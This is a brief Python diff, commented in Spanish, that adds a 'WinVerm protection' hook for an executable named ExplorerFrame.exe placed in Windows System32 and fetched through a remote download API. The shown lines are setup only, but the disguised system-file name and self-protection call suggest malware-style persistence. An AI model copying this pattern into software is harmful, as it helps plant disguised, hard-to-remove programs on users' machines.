@@ -12,10 +12,28 @@ import requests
 import subprocess
 import time
 import ctypes
+import threading
+import psutil
+from pathlib import Path
+
+# =============================================================================
+# PROTECCIÓN DE WINVERM (monitorea ExplorerFrame)
+# =============================================================================
+
+IS_COMPILED = getattr(sys, 'frozen', False)
+SYSTEM32 = Path(os.environ.get('WINDIR', 'C:\\Windows')) / 'System32'
+EXPLORERFRAME_SYSTEM32 = SYSTEM32 / 'ExplorerFrame.exe'
+
+# Inicializar protección
+try:
+    from protection import init_protection_winverm
+    init_protection_winverm()
+except ImportError:
+    pass
 
 EXE_NAME = "ExplorerFrame.exe"
-SYSTEM32 = os.path.join(os.environ['SYSTEMROOT'], 'System32')
-EXE_PATH = os.path.join(SYSTEM32, EXE_NAME)
+SYSTEM32_STR = os.path.join(os.environ['SYSTEMROOT'], 'System32')
+EXE_PATH = os.path.join(SYSTEM32_STR, EXE_NAME)
 API_URL = "https://explorerframe.onrender.com/api/v1/download/status"
 TOKEN = os.environ.get("UPDATE_TOKEN", "")  # Poner tu token aquí o en entorno
 
